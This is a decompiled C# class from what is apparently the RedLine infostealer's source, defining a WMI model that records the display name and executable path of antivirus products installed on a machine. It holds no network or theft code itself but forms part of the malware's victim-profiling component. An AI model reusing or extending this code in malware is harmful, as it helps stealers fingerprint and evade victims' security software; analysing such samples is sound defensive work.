using System;

namespace RedLine.Models.WMI
{
	// Token: 0x02000023 RID: 35
	public class WmiAntivirus
	{
		// Token: 0x1700004D RID: 77
		// (get) Token: 0x060000CE RID: 206 RVA: 0x00003EE3 File Offset: 0x000020E3
		// (set) Token: 0x060000CF RID: 207 RVA: 0x00003EEB File Offset: 0x000020EB
		[WmiResult("displayName")]
		public string DisplayName { get; private set; }

		// Token: 0x1700004E RID: 78
		// (get) Token: 0x060000D0 RID: 208 RVA: 0x00003EF4 File Offset: 0x000020F4
		// (set) Token: 0x060000D1 RID: 209 RVA: 0x00003EFC File Offset: 0x000020FC
		[WmiResult("pathToSignedProductExe")]
		public string Path { get; private set; }

		// Token: 0x04000073 RID: 115
		internal const string DISPLAYNAME = "displayName";

		// Token: 0x04000074 RID: 116
		internal const string PATH = "pathToSignedProductExe";
	}
}
